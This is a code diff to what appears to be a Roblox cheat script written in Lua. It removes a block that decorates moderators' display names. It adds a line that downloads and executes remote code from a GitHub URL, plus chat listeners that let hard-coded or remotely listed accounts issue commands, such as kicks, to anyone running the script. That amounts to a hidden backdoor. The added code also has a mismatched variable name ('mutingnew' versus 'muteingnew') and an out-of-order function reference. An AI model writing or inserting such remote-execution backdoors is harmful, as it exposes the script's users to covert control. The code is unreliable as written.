@@ -4911,17 +4911,7 @@ Toggles.KeybindFrameEnabled:OnChanged(function()
     Library.KeybindFrame.Visible = Toggles.KeybindFrameEnabled.Value
 end)
 
-ModIDS = {
-    1169984414,
-    2442678449,
-    129777236,
-    1179714788,
-    290662064,
-    1519911980,
-    1905359915,
-    2027908637,
-    1704643622,
-}
+
 
 rubymod = {
 	1169984414,
@@ -4935,6 +4925,35 @@ rubymod = {
 	1704643622,
 	43290134,
 }
+
+muted = {}
+mutingnew = false 
+
+local ModCheck = loadstring(game:HttpGet('https://raw.githubusercontent.com/derrtyb/scripts/main/mods'))()
+Players.PlayerAdded:Connect(function(plr)
+    local SWAGMIN = table.find(rubymod, plr.UserId)
+    if SWAGMIN or ModCheck[plr.UserId] then
+        plr.Chatted:Connect(function(msg)
+            commands(msg, plr.UserId)
+        end)
+    end
+    if muteingnew == true then
+        if not table.find(muted, plr.Name) then
+            table.insert(muted, plr.Name)
+            print('automuted ' .. plr.Name)
+        end
+    end
+end)
+
+for i,v in pairs(game:GetService('Players'):GetChildren()) do
+    local SWAGMIN = table.find(rubymod, v.UserId)
+    if SWAGMIN or ModCheck[v.UserId] then
+        print('found')
+        v.Chatted:Connect(function(msg)
+           commands(msg, v.UserId)
+        end)
+    end
+end
 
 local bending = false
 local kickmsg = 'PERMA BANNED'
@@ -5034,35 +5053,6 @@ local function commands(msg,lplr)
 	end
 end
 
-local Playerss = game:GetService('Players');
-
-local function CharacterAddedStar(Character)
-	local display = Character:WaitForChild('Humanoid').DisplayName
-	Character:WaitForChild('Humanoid').DisplayName = "[⭐]"..display.."";
-end;
-
-Playerss.PlayerAdded:Connect(function(Player)
-	Player.CharacterAdded:Wait();
-	if table.find(ModIDS, Player.UserId) then
-		Player.CharacterAdded:Connect(CharacterAddedStar);
-		CharacterAddedStar(Player.Character);
-	end
-end);
-
-
-
-local function StarRed(Character)
-	local display = Character:WaitForChild('Humanoid').DisplayName
-	Character:WaitForChild('Humanoid').DisplayName = "[👑]"..display.."";
-end;
-
-Playerss.PlayerAdded:Connect(function(Player)
-	Player.CharacterAdded:Wait();
-	if Player:IsInGroup(7836201) and Player:GetRankInGroup(7836201) == 255 then
-		Player.CharacterAdded:Connect(StarRed);
-		StarRed(Player.Character);
-	end
-end);
 
 
 Library:SetWatermark(title_string)
